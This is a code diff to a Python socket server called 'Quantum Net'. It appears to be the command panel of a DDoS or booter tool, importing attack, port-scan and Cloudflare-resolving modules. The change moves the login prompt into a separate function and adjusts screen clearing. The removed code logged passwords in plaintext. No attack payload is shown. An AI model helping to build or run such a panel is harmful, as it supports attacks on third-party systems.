@@ -28,6 +28,7 @@ from assets.Commands.cf import *
 from assets.Commands.admin import *
 from assets.Commands.portscan import *
 from assets.Commands.attack import *
+from assets.Commands.main import *
 from netControl.get_usage import *
 
 # if utils.GetOS() == True:
@@ -44,6 +45,7 @@ buffer_length = 1024 # We Set The Buffer Over Here So It Can Be Reused So Use It
 host = "0.0.0.0"
 timenow = datetime.datetime.now()
 port = random.randint(0, 65535)
+
 if len(sys.argv) == 2:
         if sys.argv[1] == "-on":
                 host = requests.get("https://api.ipify.org").text
@@ -66,25 +68,7 @@ def handle_connection(client, addr):
         Current.CurrentInfo['IP'] = addr[0]
         utils.set_Title(client, "Login")
 
-        # User Input Login Section
-        client.send("Username: ".encode())
-        username = client.recv(buffer_length).decode().strip().replace("\r\n", "")
-        client.send("Password: ".encode())
-        password = client.recv(buffer_length).decode().strip().replace("\r\n", "")
-
-        client.send(f"{username} | {password}\r\n".encode())
-        client.send("Welcome to Quantum Net\r\n".encode())
-
-        # Login Check
-        if "[+]" in Auth.Login(username, password, addr[0]): # This is a weird way of authentication lol 
-                client.send(f"Welcome: {username}\r\n".encode())
-                Current.CurrentInfo['Username'] = username
-                client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main") + "\r\n" + BannerModify.GetBannerFromFile("net_stats")).encode())
-                MainLogger.Log(f"login: {username} | {password} {utils.CurrentTime()}", True)
-        else:
-                client.send("[x] Error, Incorrect username or password. Try again....".encode())
-                time.sleep(4)
-                client.close()
+        username = MainScreen(client, addr[0])
 
         utils.set_Title(client, f"Quantum NET | User: {username}")
 
@@ -100,14 +84,14 @@ def handle_connection(client, addr):
                         Current.CurrentCmd["fullcmd"] = data
                         Current.CurrentInfo['Username'] = username
 
-                client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
+                # client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
 
                 if data.lower() == "help" or data.lower() == "?":
                         client.send(str(BannerModify.GetBannerFromFile("help")).encode())
                 if "reslove" in data:
                     cloudflare_resolve(client)
                 elif data.lower() == "clear" or data.lower() == "cls":
-                        continue
+                        client.send(str(Strings.MainColors['Clear'] + BannerModify.GetBannerFromFile("main")).encode())
                 elif data.lower() == "methods":
                         client.send(str(BannerModify.GetBannerFromFile("methods")).encode())
                 elif data.lower() == "api_status":
